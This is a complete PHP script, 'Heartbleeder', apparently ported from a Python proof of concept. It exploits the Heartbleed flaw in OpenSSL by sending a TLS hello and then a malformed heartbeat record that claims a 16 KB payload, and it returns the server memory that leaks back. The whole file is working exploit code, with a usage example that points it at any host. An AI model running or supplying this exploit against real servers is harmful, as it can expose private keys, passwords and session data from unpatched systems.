<?php
// Heartbleeder.php
//
// Ripped off from jspenguin@jspenguin.org's python demonstation.
//
// Just give it a host (plus an optional port) and call go()!
//
//	$hb = new Heartbleeder('butts.com');
//	$data = $hb->go();
//	var_dump($data);
//

class Heartbleeder {
	const HELLO = <<<EOT
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
EOT;

	const HEARTBEAT = <<<EOT
18 03 02 00 03
01 40 00
EOT;

	// --------------------------------------------------------------------------------------------------------------------

	public function __construct($host, $port = 443) {
		$this->host = $host;
		$this->port = $port;
	}


	public function go() {
		$sock = fsockopen($this->host, $this->port);

		fwrite($sock, $this->dehex(self::HELLO));

		do {
			$resp = $this->recvmsg($sock);
			if (!$resp) throw new Exception("server closed connection without saying hello");

			$type = $resp['type'];
			$fc = ord($resp['pay'][0]);

			if ($type == 22 && $fc == 14) break;

		} while(true);

		fwrite($sock, $this->dehex(self::HEARTBEAT));
		$resp = $this->recvmsg($sock);

		return $resp['pay'];
	}

	// --------------------------------------------------------------------------------------------------------------------

	public function dehex($str) {
		return hex2bin(preg_replace('/[\s]+/', '', $str));
	}


	public function recvmsg($sock) {
		$hdr = fgets($sock, 6);
		if (!$hdr) throw new Exception("error receiving record header");

		$packed = unpack('C1type/n1ver/n1length', $hdr);

		$payload = '';
		while (strlen($payload) < $packed['length']) {
			$read = fgets($sock, $packed['length'] + 1 - strlen($payload));
			if (!$read) {
				throw new Exception("unexpectedly short payload");
			}
			$payload .= $read;
		}

		return array(
			'type'		=> $packed['type'],
			'ver'		=> $packed['ver'],
			'pay'		=> $payload,
		);
	}

}


